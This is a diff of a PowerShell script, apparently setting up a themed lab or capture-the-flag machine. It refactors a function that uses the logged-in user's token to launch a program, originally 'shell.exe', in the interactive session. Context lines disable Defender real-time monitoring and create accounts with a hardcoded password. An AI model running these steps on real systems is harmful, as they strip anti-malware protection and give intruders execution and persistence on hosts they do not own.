@@ -31,14 +31,20 @@
 # disable anti-malware
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-Add-Type -AssemblyName System.Runtime.InteropServices
+function Invoke-RunInActiveSession {
+    param(
+        [string]$Exe,
+        [string]$Arguments = "",
+        [string]$WorkingDirectory = ""
+    )
 
-$signature = @"
+    Add-Type -AssemblyName System.Runtime.InteropServices
+
+    $source = @"
 using System;
 using System.Runtime.InteropServices;
 
-public class RunInUserSession
-{
+public class SessionRunner {
     [DllImport("kernel32.dll", SetLastError=true)]
     public static extern bool CloseHandle(IntPtr hObject);
 
@@ -61,8 +67,7 @@ public class RunInUserSession
     );
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO
-    {
+    public struct STARTUPINFO {
         public uint cb;
         public string lpReserved;
         public string lpDesktop;
@@ -84,8 +89,7 @@ public class RunInUserSession
     }
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION
-    {
+    public struct PROCESS_INFORMATION {
         public IntPtr hProcess;
         public IntPtr hThread;
         public uint dwProcessId;
@@ -94,19 +98,38 @@ public class RunInUserSession
 }
 "@
 
-Add-Type -TypeDefinition $signature
+    Add-Type $source
 
-$sess = (Get-Process explorer).SessionId
-$exe = "C:\Users\jack.frost.admin\Documents\shell.exe"
+    # Get interactive session ID (session with explorer.exe)
+    $session = (Get-Process explorer -ErrorAction Stop | Select-Object -First 1).SessionId
 
-[IntPtr]$userToken = [IntPtr]::Zero
-[RunInUserSession]::WTSQueryUserToken($sess, [ref]$userToken)
+    # Duplicate token
+    [IntPtr]$uToken = [IntPtr]::Zero
+    [SessionRunner]::WTSQueryUserToken($session, [ref]$uToken) | Out-Null
 
-$si = New-Object RunInUserSession+STARTUPINFO
-$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
-$pi = New-Object RunInUserSession+PROCESS_INFORMATION
+    # Prepare structures
+    $si = New-Object SessionRunner+STARTUPINFO
+    $si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
 
-[RunInUserSession]::CreateProcessAsUser($userToken, $exe, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, (Split-Path $exe), [ref]$si, [ref]$pi)
+    $pi = New-Object SessionRunner+PROCESS_INFORMATION
+
+    $cmd = "`"$Exe`" $Arguments".Trim()
+
+    # Launch inside user session
+    [SessionRunner]::CreateProcessAsUser(
+        $uToken,
+        $Exe,
+        $cmd,
+        [IntPtr]::Zero,
+        [IntPtr]::Zero,
+        $false,
+        0,
+        [IntPtr]::Zero,
+        $WorkingDirectory,
+        [ref]$si,
+        [ref]$pi
+    ) | Out-Null
+}
 
 # Create accounts
 $Password = ConvertTo-SecureString "ItsColdOutside!" -AsPlainText -Force
